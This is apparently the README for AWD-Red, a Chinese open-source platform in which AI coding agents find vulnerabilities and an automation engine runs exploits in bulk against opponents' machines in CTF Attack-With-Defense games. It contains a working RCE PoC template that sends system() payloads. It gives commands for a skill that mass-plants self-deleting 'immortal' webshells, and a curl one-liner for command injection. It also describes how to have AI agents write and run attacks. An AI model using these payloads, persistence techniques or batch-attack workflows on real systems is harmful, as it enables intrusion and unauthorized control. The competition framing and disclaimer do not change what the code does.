# 🚩 AWD-Red: Next-Gen AI Agent Driven Automated Attack Platform for AWD / AWD-Plus

[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Battle Tested](https://img.shields.io/badge/Battle--Tested-180%2B%20Flags%20Achieved-red.svg)](#炼成之路与实战背景)
[![Architecture: Decoupled](https://img.shields.io/badge/Architecture-AI%20Decoupled-orange.svg)](#核心哲学agent-与自动化的边界判断矩阵)
[![UI: Zero-Dependency](https://img.shields.io/badge/UI-Zero%20Dependency%20Web-purple.svg)](#轻量全景态势大盘)

> **“重复的工作、批量并发的工作，智能体能不参与，就一定不让智能体参与。”**  
> **“Agent 能做一件事，不代表这件事就应该一直交给 Agent 做。”**

AWD-Red 是专为 CTF AWD (Attack With Defense) 与 AWD-Plus 攻防对抗赛设计的**下一代 AI Agent 解耦型自动化攻防平台**。

在真实大型网络安全对抗赛中，本套架构经受住了高强度实战检验，完成了针对全网存活对手靶机的全自动持续并发打击与周期性轮次提交，**斩获 180+ Flag 量级的实战战果**。

---

## 目录
- [炼成之路与实战背景](#炼成之路与实战背景)
- [核心哲学：Agent 与自动化的边界判断矩阵](#核心哲学agent-与自动化的边界判断矩阵)
- [💡 推荐玩法：自研构建 vs AI 适配部署](#-推荐玩法自研构建-vs-ai-适配部署)
  - [玩法一：带着思路与提示词，让 AI 在 1 小时内为你自建系统 (强烈推荐)](#玩法一带着思路与提示词让-ai-在-1-小时内为你自建系统-强烈推荐)
  - [玩法二：使用本项目源码，借助 AI 自动化部署与本地环境适配](#玩法二使用本项目源码借助-ai-自动化部署与本地环境适配)
- [双阶段实战作战流水线](#双阶段实战作战流水线)
- [核心技术特性](#核心技术特性)
  - [1. ⚡ 双触发执行引擎 (定时周期 + 事件即时抢跑)](#1--双触发执行引擎-定时周期--事件即时抢跑)
  - [2. 🪄 裁判机提交零编码智能适配 (复制原生报文)](#2--裁判机提交零编码智能适配-复制原生报文)
  - [3. 🛡️ 进程级硬超时熔断与动态热编译](#3-️-进程级硬超时熔断与动态热编译)
  - [4. 📊 纯原生深色全景态势大盘](#4--纯原生深色全景态势大盘)
- [项目目录结构](#项目目录结构)
- [快速开始](#快速开始)
- [PoC 编写与交付规范 (五大硬契约)](#poc-编写与交付规范-五大硬契约)
- [五大配套 AWD Skills 武器库](#五大配套-awd-skills-武器库)
- [RESTful API 接口速查](#restful-api-接口速查)
- [安全与免责声明](#安全与免责声明)

---

## 炼成之路与实战背景

在最初尝试用 AI Agent 打 AWD 时，我们最初的想法非常直观：**将整个攻防流程都写成 Skills，让 Agent 从头到尾包揽全部工作**——源码拉取、代码审计、漏洞挖掘、PoC 生成、批量攻击、Flag 提取、去重提交、后门持久化……

我们投入了大量精力去打磨全套 Skills。然而，**当全量 Skills 越写越全面时，心里反而越来越慌**。

### 痛点：一个本地模型，撑不起整场比赛的高频并发
AWD 比赛的核心机制决定了：**找到漏洞并写出 PoC 仅仅是战斗的起点**。
- 比赛中需要针对数十台甚至上百台对手靶机批量执行；
- 裁判机的 Flag 会随着轮次（如每 5~10 分钟）不断刷新重置，需要高频反复发起攻击；
- **如果所有操作都依赖 Agent + Skills，那么宝贵的本地模型推理资源就会被大量的“选目标、发包、正则判结果、调接口提交”等机械化重复操作彻底卡死！**

模型明明已经攻克了最困难的“漏洞挖掘与利用链构造”，为什么还要让它把算力浪费在重复一千次的固定操作上？

### 重构：比赛前夜的彻底解耦
比赛前夜，我们推翻了“Agent 包办一切”的做法，明确了一条铁律：
> **重复的工作、批量并发的工作，智能体能不参与，就一定不让智能体参与。**

我们将整个系统拆解为两半：
1. **Agent + Skills**：专注于“未知、探索性、高智力”的漏洞挖掘与代码审计，输出标准化交付物（标准 PoC）；
2. **AWD-Red 平台**：作为常驻守护引擎，专注于“成熟、确定性、高并发”的批量执行、动态编译、去重过滤、双触发调度与结果入库。

重构之后，整套系统在实战中爆发出了惊人的威力——研究与执行并行不悖，最终在实战中完成了大量目标的持续自动化压制，斩获 **180+ Flag** 量级的战果。

---

## 核心哲学：Agent 与自动化的边界判断矩阵

这次实战最终沉淀出了一套通用的**智能体与工具边界判断法则**，不仅适用于 AWD，也适用于 AI 红蓝对抗、渗透测试与复杂 Agent 软件工程：

| 任务特征 | 典型场景 | 推荐选型 | 决策依据 |
| :--- | :--- | :--- | :--- |
| **未知环境、一次性适配** | 现场定位靶机源码目录、识别特殊部署环境 | **Agent + Skills** | 环境不确定，固化脚本极易报错，单次探索性价比最高 |
| **复杂分析、漏洞研究** | 源码审计、反序列化调用链挖掘、隐蔽逻辑漏洞 | **Agent 自主探索** | 需要深度上下文理解与逻辑推理，工具无法替代 |
| **规范交付与脚手架** | 按照平台规范生成标准 PoC 模板并单机调试 | **Agent + 标准化 Skills** | 约束输出格式，保证与下游流水线无缝契合 |
| **固定流程、低频工作** | 批量向存活靶机投递不死马、备份文件压缩 | **轻量脚本 / 工具** | 流程成熟固定，无需消耗昂贵的模型 Token |
| **大量并发、周期性执行** | 每轮数百目标并发打 PoC、Flag 自动提交、去重 | **独立自动化平台 (AWD-Red)** | 追求纳秒/毫秒级吞吐、进程隔离与稳定性，坚决剥离大模型 |
| **执行中突发未知异常** | 某类靶机出现全新 WAF 拦截或环境崩溃 | **交回 Agent 重新介入** | 自动化平台熔断告警，唤醒智能体研究针对性绕过 |

---

## 💡 推荐玩法：自研构建 vs AI 适配部署

### 玩法一：带着思路与提示词，让 AI 在 1 小时内为你自建系统 (强烈推荐)

> **代码是静态的，而思路是活的。**

每个战队面临的比赛环境、Python 版本、本地模型显存、外网代理规则、习惯使用的漏洞扫描工具（如 D盾、Semgrep、河马、自研正则）都有差异。

事实上，**只要掌握了本文档中阐述的这套“解耦设计哲学”、“双触发机制”与“PoC 五大硬契约”，你完全可以带着本文档的提示词与架构图，直接输入给 Claude Code、Antigravity 或 Cursor——半小时到一小时之内，AI 就能为你现场手搓出一套完全贴合你个人战斗习惯的 AWD 自动化平台！**

你只需要告诉 AI：
```markdown
“请根据 AWD-Red 的解耦设计哲学，为我构建一个本地 AWD 攻防平台：
 1. 采用 SQLite WAL 模式支持高并发读写；
 2. 具备 pocs/incoming/ 动态监听热注册能力；
 3. 严格遵循双轨传参、2秒网络超时、纯净输出的 PoC 5大硬契约；
 4. 实现定时轮次与新 PoC 就绪即刻触发的双触发调度；
 5. 前端提供单页深色态势看板。”
```
我们非常鼓励大家以此思路进行自由创新与二开重构。

---

### 玩法二：使用本项目源码，借助 AI 自动化部署与本地环境适配

如果你选择直接使用本项目源码，**强烈建议同样借助 AI Agent 来进行部署与环境适配，而非纯手工敲命令**：

1. **AI 辅助部署**：将本仓库目录直接交由你的 AI 编码助手（如 Claude Code / Antigravity CLI 等）；
2. **本地环境适配**：直接向 AI 发出指令：
   > *“请阅读本项目源码与 requirements.txt，帮我部署并在本地启动 AWD-Red。请自动检查我的 Python 环境、定位我本地的代理端口，并帮我把本地的漏洞扫描器/SSH 免密密钥路径与 skills 配置完成对接。”*
3. **针对性调优**：让 AI 依据你本地 Mac / Linux 的 CPU 核心数与并发承载力，自适应调整 `settings.json` 中的 `max_workers`（推荐 20~50）与 `poc_timeout`。

---

## 双阶段实战作战流水线

在实战中，AWD-Red 配合 Agent 形成了标准的两阶段作战流水线：

```
                    【第一阶段：快速扫描，优先形成 RCE 攻击能力】
                                       │
     ┌─────────────────────────────────┴─────────────────────────────────┐
     ▼                                                                   ▼
[awd-vulscan 免密拉取]                                          [自动调用审计引擎]
     │                                                                   │
     └─────────────────────────────────┬─────────────────────────────────┘
                                       ▼
                       【优先筛选 RCE 级别漏洞】
                                       │
                                       ▼
                    [awd-poc 生成标准化 RCE PoC 并验证]
                                       │
                                       ▼ (交付至 pocs/incoming/)
     ═════════════════════════════════════════════════════════════════════════
                    【AWD-Red 核心引擎：事件触发即刻抢跑】
                  - 3秒内热加载并编译就绪 (pocs/ready/)
                  - 瞬间发起全网多目标并发打击，斩获开局首杀！
     ═════════════════════════════════════════════════════════════════════════
                                       │
                                       ▼
                    【第二阶段：深度代码审计，持续挖掘隐蔽链】
                                       │
     ┌─────────────────────────────────┴─────────────────────────────────┐
     ▼                                                                   ▼
[AWD-Red 持续巡航]                                              [Agent 深入审计源码]
每 10 分钟定时轮询全量目标                                       挖掘复杂反序列化、特殊调用链、
持续收割刷新出的新 Flag                                          二次注入等常规工具无法发现的漏洞
     │                                                                   │
     │ ◄──────────────── 新 PoC 交付即刻触发抢跑 ──────────────────────────┘
     ▼
[Flag 自动去重] ──► [HTTP 原生会话提交] ──► [态势大盘实时大捷]
```

---

## 核心技术特性

### 1. ⚡ 双触发执行引擎 (定时周期 + 事件即时抢跑)
- **定时周期巡航 (Periodic Cron)**：默认每轮（如 10 分钟）自动调度线程池，对全量存活对手靶机批量运行 `pocs/ready/` 中的所有活跃 PoC，稳定收割随轮次刷新的新 Flag；
- **事件驱动即时抢跑 (Event-Driven Trigger)**：一旦 Agent 挖掘出新漏洞并将 PoC 放入 `incoming/`，平台监听到文件变更并完成热编译后，**毫秒级立即强插触发一轮针对全量靶机的并发打击**，无需傻等下一个 10 分钟周期，将利用窗口期压缩至极限！

### 2. 🪄 裁判机提交零编码智能适配 (复制原生报文)
面对每场规则各异的比赛裁判机（提交参数名、JSON 格式、Cookie 认证、Token 命名五花八门），现场写提交代码极易踩坑。
- **免代码方案**：在 Web 界面中，**直接粘贴从浏览器 F12 抓到的原始 HTTP 提交请求**；
- 平台内置智能提取器，自动解析 URL、Method、Headers 与 Token，并复用登录状态，10 秒内搞定任意未知比赛的提交对接。

### 3. 🛡️ 进程级硬超时熔断与动态热编译
- **2 秒网络硬超时**：多目标并发执行池原生集成硬超时熔断机制，任一靶机被其他队伍打崩、网络挂起或反制防御，绝不会导致平台整体调度发生级联阻塞；
- **3 秒无感热注册**：文件系统监听器每 3 秒巡检一次，自动完成静态语法审查，安全提升至 `ready/` 目录。

### 4. 📊 纯原生深色全景态势大盘
- 基于原生 HTML5/JS/CSS，**无 npm / Node.js 繁重构建链路**，单机轻量自愈；
- 实时展示存活靶机呼吸灯矩阵、漏洞利用状态、Flag 提交战果曲线与轮次日志流。

---

## 项目目录结构

```
awd-red/
├── app.py                     # 平台主入口 (HTTP API + Web 控制台 + 调度器启动)
├── start.sh                   # 一键启动脚本 (自动校验虚拟环境与依赖)
├── stop.sh                    # 一键停止脚本
├── requirements.txt           # Python 依赖清单
├── core/                      # 平台核心引擎
│   ├── config.py              # 配置中心管理
│   ├── config_parser.py       # 赛事文本/原生报文智能解析器
│   ├── db.py                  # SQLite WAL 数据库模型 (高并发无锁设计)
│   ├── executor.py            # 多目标并发执行器 (进程池与熔断控制)
│   ├── poc_manager.py         # PoC 动态热注册与生命周期管理
│   ├── submitter.py           # Flag 统一提交客户端 (重试与会话复用)
│   └── cron_manager.py        # 双触发调度看门狗 (定时巡航 + 事件抢跑)
├── config/                    # 比赛配置文件 (全部内置脱敏模板)
│   ├── settings.json          # 运行参数 (轮次时间、取旗命令、并发数)
│   ├── submitter.json         # 裁判机提交配置
│   └── targets.txt            # 目标靶机 IPv4 列表 (支持 CIDR 与范围简写)
├── pocs/                      # PoC 热加载仓库
│   ├── incoming/              # Agent/选手交付目录 (平台自动监听)
│   ├── ready/                 # 已激活参与调度的有效 PoC
│   ├── disabled/              # 手动暂停的 PoC
│   └── failed/                # 编译错误或异常的 PoC
├── tools/                     # 命令行辅助工具
│   └── flag_cli.py            # Flag 手动录入/管道提取/强制提交 CLI
├── web/                       # 纯前端控制台 (开箱即用)
│   ├── index.html             # 单页控制台 HTML
│   ├── app.js                 # 控制台交互逻辑
│   └── style.css              # 极简深色主题样式
└── skills/                    # 配套 AI Agent 武器库 (支持 Antigravity / Claude / Cursor)
    ├── awd-poc/               # PoC 标准模板生成与本地单目标验证
    ├── awd-vulscan/           # 源码免密拉取、D盾规则漏洞扫描与自动落库
    ├── awd-shell/             # 批量不死马 (Immortal Webshell) 投递与持久化
    ├── awd-addflag/           # 外部/反弹会话 Flag 录入与管道自动提取
    └── awd-asset/             # 资产管理、5秒探活看门狗与独立全景 WebUI
```

---

## 快速开始

### 1. 安装运行环境
推荐使用 Python 3.10+：
```bash
git clone https://github.com/svenuks/awd-red.git
cd awd-red

# 建议使用虚拟环境
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

### 2. 启动服务
```bash
./start.sh
```
启动成功后，浏览器访问控制台：  
👉 **http://127.0.0.1:8800**

停止服务：
```bash
./stop.sh
```

---

## PoC 编写与交付规范 (五大硬契约)

为确保 AI Agent 编写的 PoC 能被平台稳定、无差错地并发执行，所有 PoC 必须满足**五大契约**：

1. **输入契约（双轨传参）**：必须支持接收 `sys.argv[1]` 作为目标 IP；接收 `sys.argv[2]` 或环境变量 `GET_FLAG_CMD` 作为取旗命令，并固化默认常量 `DEFAULT_FLAG_CMD`。
2. **清洗契约**：严禁携带扫描器前缀（如 `REQUEST:a`, `POST:cmd` 必须清洗为 `a`, `cmd`）。
3. **超时契约**：所有的网络请求必须显式设置 `timeout=2.0` 内，严禁无限制挂起。
4. **输出契约**：标准输出仅打印提取到的纯净 Flag 原文，异常情况内部捕获，绝不污染 stdout。
5. **验证契约**：本地必须执行 `python3 poc.py <测试IP>` 验证可用后，再移入 `pocs/incoming/`。

### 标准 PoC 参考实现模板

```python
#!/usr/bin/env python3
"""
AWD 标准 RCE PoC 示例模板
遵循 AWD-Red 5大硬契约规范
"""
import sys
import os
import re
import requests

# 契约 1: 固化默认取旗命令 (从平台配置自动继承)
DEFAULT_FLAG_CMD = "curl -s 'http://10.0.0.1/get_flag'"
FLAG_REGEX = re.compile(r"flag\{[a-zA-Z0-9_\-]+\}")

def exploit(target_ip: str, flag_cmd: str):
    url = f"http://{target_ip}:80/index.php"
    
    # 构造载荷并做安全转义
    escaped_cmd = flag_cmd.replace("'", "\\'")
    data = {
        # 契约 2: 参数名清洗，无 REQUEST:/POST: 前缀
        "cmd": f"system('{escaped_cmd}');"
    }

    try:
        # 契约 3: 严格设置 2 秒网络硬超时
        resp = requests.post(url, data=data, timeout=2.0)
        
        # 提取 Flag
        flags = FLAG_REGEX.findall(resp.text)
        if flags:
            # 契约 4: 纯净输出 Flag
            print(flags[0])
            return True
        return False
    except Exception:
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 poc.py <target_ip> [flag_cmd]")
        sys.exit(1)

    target_ip = sys.argv[1].strip()
    # 契约 1: 双轨动态传参，支持单独调试与平台批量调度
    flag_cmd = sys.argv[2].strip() if len(sys.argv) > 2 and sys.argv[2].strip() else os.environ.get("GET_FLAG_CMD", DEFAULT_FLAG_CMD)

    exploit(target_ip, flag_cmd)
```

---

## 五大配套 AWD Skills 武器库

AWD-Red 在 `skills/` 目录下集成了 5 个标准化的 AI Agent 技能模块，可无缝对接任何 Agent（如 Antigravity CLI、Claude Code、Cursor 等）：

1. **`awd-poc`**：查询待利用漏洞库，一键生成合规 PoC 模板并提供单机调试能力。
   ```bash
   python3 skills/awd-poc/scripts/poc_helper.py gen <漏洞ID>
   ```
2. **`awd-vulscan`**：通过 SSH 免密拉取防守机源码，调用内置审计引擎（含 macOS 原生免 Wine D盾扫描实现）自动提取高危入口并热落库。
   ```bash
   python3 skills/awd-vulscan/scripts/awd_vulscan.py --host 192.168.1.50 --user ctf --pass "ctfpass"
   ```
3. **`awd-shell`**：批量向存活靶机植入高隐蔽不死马（Dropper 自删 + 无限循环重写），并在平台登记后门入口。
   ```bash
   python3 skills/awd-shell/scripts/awd_shell.py run --flag-cmd 'curl http://10.0.0.1/get_flag' --json
   ```
4. **`awd-addflag`**：全场景 Flag 录入工具，支持终端管道从 curl 或日志输出中自动正则提取 Flag 并触发提交。
   ```bash
   curl -s http://192.168.1.101/curl.php -d "1=system('cat /flag');" | python3 tools/flag_cli.py pipe --submit
   ```
5. **`awd-asset`**：集中式目标资产数据库与 5 秒探活看门狗，自拉起单页全景 WebUI（`127.0.0.1:8090`）。

---

## RESTful API 接口速查

| 方法 | 路径 | 功能说明 |
| :--- | :--- | :--- |
| `GET` | `/api/status` | 获取当前轮次态势、统计数据（存活靶机、PoC数量、Flag数） |
| `GET` | `/api/targets` | 获取当前全部目标列表及最新存活状态 |
| `POST`| `/api/targets` | 批量录入或覆盖目标列表 (支持 CIDR 与简写) |
| `GET` | `/api/vulns` | 获取漏洞库中已审计录入的所有漏洞清单 |
| `POST`| `/api/vulns` | 外部审计工具录入新漏洞 |
| `GET` | `/api/pocs` | 列出当前 `ready`、`incoming`、`disabled`、`failed` 的全部 PoC |
| `POST`| `/api/pocs/toggle` | 动态启用 / 停用指定 PoC |
| `GET` | `/api/flags` | 查询最近捕获的 Flag 记录与裁判机返回状态 |
| `POST`| `/api/flags` | 外部脚本录入新 Flag 并触发去重排队 |
| `POST`| `/api/submit` | 手动强制触发一次待提交 Flag 的全量上报 |
| `GET` | `/api/settings` | 查询当前平台配置（轮次时长、取旗命令、并发数等） |
| `POST`| `/api/settings` | 更新平台配置并即时热生效 |
| `GET` | `/api/logs` | 实时流式读取平台轮次调度日志 |

---

## 安全与免责声明

1. **网络安全隔离**：
   - 本平台默认**严格监听 `127.0.0.1` 本机回环地址**。严禁在未经认证鉴权的情况下将管理控制台暴露至公网。
2. **免责声明**：
   - 本工具仅供网络安全攻防对抗演练（AWD / AWD-Plus / CTF 竞赛）、受控实验环境下的教学科研及经授权的安全测试使用。
   - 使用者须严格遵守《中华人民共和国网络安全法》及相关法律法规。因将本工具用于未经授权的非法测试所产生的一切后果，均由使用者本人承担，开发者不承担任何法律责任。

---

## 开源许可证

本项目基于 [MIT License](LICENSE) 开源发布。
欢迎提交 Issue 和 Pull Request 共建！
